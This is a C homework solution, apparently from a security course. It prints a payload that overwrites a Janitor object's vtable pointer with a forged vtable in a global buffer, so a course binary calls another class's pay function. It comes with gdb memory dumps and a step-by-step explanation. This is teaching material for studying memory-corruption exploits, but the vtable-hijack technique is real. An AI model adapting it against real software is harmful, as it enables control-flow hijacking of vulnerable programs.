/*  
*   Stephen Tambussi
*   COEN225
*   HW2: problem 2
*   10/18/22
*/
#include <stdio.h>

//32 bytes
char sc[] =
"\x2c\x8a\x04\x08" //4 bytes --> President pay function address (0x08048a2c)
"\xf6\x8b\x04\x08" //4 bytes --> Janitor info function address (0x08048bf6)
"\x90\x90\x90\x90" //4 bytes --> NOPs for filler
"\xb8\x8e\x04\x08" //4 bytes --> Janitor type info address (0x08048eb8)
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"; //16 bytes --> NOPs for filler

char name[] = "\x61\x64\x61\x6d"; //4 bytes --> Janitor name (0x6d616461)

int main()
{
    unsigned int bufferAddress = 0x0804b160; //4 bytes
    //Need 40 bytes
    printf("%s%s%s\n", sc, (char *)&bufferAddress, name);
    return 0;
}

/*  Mem layout in gdb:
*   0x804b160 <buffer>:     0x00000000      0x00000000      0x00000000      0x00000000
*   0x804b170:              0x00000000      0x00000000      0x00000000      0x00000000
*   0x804b180 <j1>:         0x08048e68      0x6d616461      0x00000000      0x00000000
*   0x804b190 <j1+16>:      0x00000000      0x00000000      0x00000000      0x00000000
*   0x804b1a0 <j1+32>:      0x00000000      0x00393032      0x00000000      0x0000c350
*   0x804b1b0:              0x00000000      0x00000000      0x00000000      0x00000000
*   0x804b1c0 <d1>:         0x08048e78      0x65746570      0x00000072      0x00000000
*   0x804b1d0 <d1+16>:      0x00000000      0x00000000      0x00000000      0x00000000  
*   0x804b1e0 <d1+32>:      0x00000000      0x00313032      0x00000000      0x000249f0
*   0x804b1f0:              0x00000000      0x00000000      0x00000000      0x00000000
*   0x804b200 <vp1>:        0x08048e88      0x6e686f6a      0x00000000      0x00000000
*   0x804b210 <vp1+16>:     0x00000000      0x00000000      0x00000000      0x00000000
*   0x804b220 <vp1+32>:     0x00000000      0x00333231      0x00000000      0x0007a120
*
*   Virtual object memory order:
*   [vptr][name    (32B)     ][id  (8B)  ][salary]
*
*   Vtable memory layout:
*   <VTableName>:   <VirtualFunction_pay>  <VirtualFunction_info>  <ignore>  <TypeInfo>
*
*   Solution Explanation:
*   To solve this problem, I determined that a new vtable needed to be created that would combine virtual functions
*   from both President and Janitor's vtables. The desired output was to include President's pay function, but keep 
*   everything else from Janitor's vtable the same. Using gdb, I first found the address of the vtables through the object's
*   vptr. Looking at the vtables, President's pay function address was at 0x08048a2c, Janitor's info function address was at
*   0x08048bf6, and Janitor's typeinfo address at 0x08048eb8. With this information, all I needed to do was format the "buffer"
*   variable with these values and some filler values to create my own vtable. Finally, I needed to overwrite the Janitor 
*   object's vptr value to point to the starting address of buffer (0x804b160). I also overwrote the Janitor object's name
*   field with the same name as I was overwriting a portion of it before. Below, I have included the memory view of the filled 
*   buffer from gdb after passing it the exploit payload:
*   0x804b160 <buffer>:     0x08048a2c      0x08048bf6      0x90909090      0x08048eb8
*   0x804b170:              0x90909090      0x90909090      0x90909090      0x90909090
*   0x804b180 <j1>:         0x0804b160      0x6d616461      0x00000000      0x00000000
*
*/